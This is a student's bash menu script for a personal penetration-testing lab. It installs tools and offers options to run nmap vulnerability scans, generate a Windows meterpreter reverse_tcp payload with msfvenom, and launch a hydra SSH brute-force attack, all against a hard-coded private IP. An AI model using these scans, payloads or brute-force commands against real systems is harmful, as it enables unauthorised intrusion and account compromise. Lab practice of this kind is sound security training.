#!BISMILLAH
#Written By:Md Sajibur Rahman
#Roll:18CSE048
#Reg:110-048-18
#University of Barishal(BU)

mycolor="\e[34m"
printf "$mycolor"

figlet -f standard "WellCome To My Penetration Testing Lab" 
echo -e "\e[31mThis \e[32mis \e[33mmy \e[34mpenetration \e[35mTesting   \e[36mLab\e[0m"

echo "[+] Enter The option to use the tools"
echo "[+] 0. Update your system and install the Dependencies"
echo "[+] 1. Enable the Services"
echo "[+] 2. Udate your Networking Cli tools"
echo "[+] 3. Nmap Installation"
echo "[+] 4. Nmap first Scan"
echo "[+] 5. Nmap second Scan"
echo "[+] 6. Nmap Thrid Scan"
echo "[+] 7. Msf-venom  windows payload "
echo "[+] 8. Msfconsole"
echo "[+] 9. Hydra Brute-force login"
echo "[+] 10.EXIT"
echo "Enter a number to choose the options"


read n
if((n==0));
then
     echo " Which Distro are you using?"
     echo "[+] 1. Debian"
     echo "[+] 2.Arch"
     echo "Choose an Option"
     read x
     if((x==1));
     then
	     sudo apt-get update -y && sudo apt-get upgrade -y
     elif((x==2));
     then
             sudo pacman -Syu	     
     fi
bash Master.sh
elif((n==1));
then
      echo "Make sure you have installed ssh,apache/apache2,mysql on your Machine" 
      sudo pacman -S apache
      sudo pacman -S mysql
      sudo pacman -S openssh-server
      sudo pacman -S ufw
      sudo ufw allow ssh
      sudo service apache2 start
      sudo service mysql start
      sudo service ssh restart

bash Master.sh
elif((n==2));
then
      echo "Install net-tools"
      echo "[+] 1. Debian Distro"
      echo "[+] 2. Arch Distro"
      echo " Choose an Option"
      read y
      if((y==1));
      then
           sudo apt-get install net-tools
      elif((y==2));
      then      
           sudo pacman -S net-tools
      fi
bash Master.sh
elif((n==3));
then	
      echo "Install Nmap"
      echo "[+] 1. Debian Distro"
      echo "[+] 2. Arch Distro"
      read z
      if((z==1));
      then
          sudo apt-get install nmap
      elif((z==2));
      then	      
           sudo pacman -S nmap
      fi 
bash Master.sh
elif((n==4));
then
      nmap 172.26.154.69 -p- --min-rate 20000 
bash Master.sh

elif((n==5));
then
      nmap -sCV 172.26.154.69
bash Master.sh      
elif((n==6));
then
     nmap -sV -sC --script=vuln -v 172.26.154.69
bash Master.sh

elif((n==7));
then
     
     echo "Open another terminal using ctrl+alt+t and the type the below commands"
     echo " Type sudo pacman -Syu for Arch-Linux and sudo apt-get update -y && sudo apt-get upgrade -y for Debian" 
     echo "Make sure you have already update or upgrade your system"
     echo "Type 'sudo pacman -S metasploit' for Arch Linux"
     echo "Type 'sudo apt-get install matasploit-framework"
     echo "your Distro"
     echo "[+] 1. Arch"
     echo "[+] 2. Debian"
     read m
     if((m==1));
     then
	 sudo pacman -S metasploit
     elif((m==2));
     then
         sudo apt-get install metasploit-framework 	     
     fi	     
     msfvenom -p windows/meterpreter/reverse_tcp lhost=172.26.154.69 lport=4444 -f raw > hack.exe	
bash Master.sh
elif((n==8));
then	
     msfconsole	
bash Master.sh
elif((n==9));
then	
     echo "You have to have a  password.txt file where the script is running" 
     echo "Make sure you have installed hydra"    
     echo "If not type 'sudo apt-get install hydra' for Debian 'sudo pacman -S hydra' for Arch"
     echo "your distro"
     echo "[+] 1.Arch"
     echo "[+] 2.Debian"   
     read k
     if((k==1));
     then
        sudo pacman -S hydra
     elif((k==2));
     then
        sudo apt-get install hydra	     
     fi
     echo admin >>password.txt &&echo sajib >>password.txt && echo toor >>password.txt
     hydra -l sajib -P password.txt -T 20 172.26.154.69  ssh
bash Master.sh
elif((n==10));
then
     exit	

fi 



